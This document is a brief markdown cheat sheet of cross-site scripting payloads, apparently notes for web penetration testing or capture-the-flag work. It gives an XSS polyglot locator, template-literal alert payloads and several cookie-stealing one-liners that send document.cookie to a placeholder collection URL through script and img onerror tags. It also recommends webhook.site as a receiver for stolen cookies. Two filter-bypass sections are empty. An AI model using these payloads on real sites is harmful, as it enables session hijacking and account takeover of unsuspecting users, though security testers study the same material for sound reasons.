# General Resources
[Webhook.site](https://webhook.site/) - Basically required to steal cookies without Burp Collaborator
[Portswigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) - XSS payload search (useful for making Burp Intruder payloads)

# XSS Locator
```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

# Stealing Cookies
Some quick payloads for stealing cookies.
## General One-Liner (Use this one first)
```javascript
<script>var i=new Image;i.src="[URL]/?"+document.cookie;</script>
```
**Example usage of above:**
```javascript
onmouseover=eval(var i=new Image;i.src="[URL]/?"+document.cookie;)
```
## Using ``<img>`` Tag
```javascript
<img src=x onerror="this.src='[URL]/?'+document.cookie;this.removeAttribute('onerror');"/>
```

# Filter Bypasses
## HTML Entities
```
```

## No parentheses
```
```


# AngularJS
[PayloadsAllTheThings - XSS in AngularJS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)

# XSS Template Literal Payloads
```javascript
alert(1)
${alert(1)}
alert(1);
${alert(1)};
`alert(1)`
`${alert(1)}`
`${alert(1)}`;
alert(1);
${alert(1)}/*
```

